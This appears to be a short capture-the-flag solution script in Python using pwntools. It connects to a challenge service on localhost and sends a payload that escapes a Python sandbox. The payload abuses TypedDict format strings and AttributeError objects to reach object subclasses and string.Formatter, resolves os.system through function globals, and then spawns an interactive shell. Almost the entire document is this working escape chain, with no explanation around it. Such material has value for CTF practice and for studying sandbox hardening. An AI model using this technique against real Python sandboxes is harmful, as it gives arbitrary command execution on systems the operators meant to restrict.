from pwn import *

#p = process(['../challenge/chal.py'])
p = remote('localhost', 5000)

code = """\
try:
    TypedDict("{name.__class__.__base__.__subclasses__.x}")
except AttributeError as e:
    sb = e.obj()

while 1:
    formatter = sb.pop()
    if "string.Formatter" in f"{formatter}":
        break

# we have to get tuple.__getitem__ smh
try:
    TypedDict("{name.__class__.__bases__.__class__.__getitem__.x}")
except AttributeError as e:
    getitem = e.obj

system = getitem(formatter().get_field("0.__globals__[sys].modules[os].system", [TypedDict], {}), 0)
system("echo pwned; sh")
# EOF
"""

p.sendlineafter(b"code:\n", code.encode())

p.interactive()
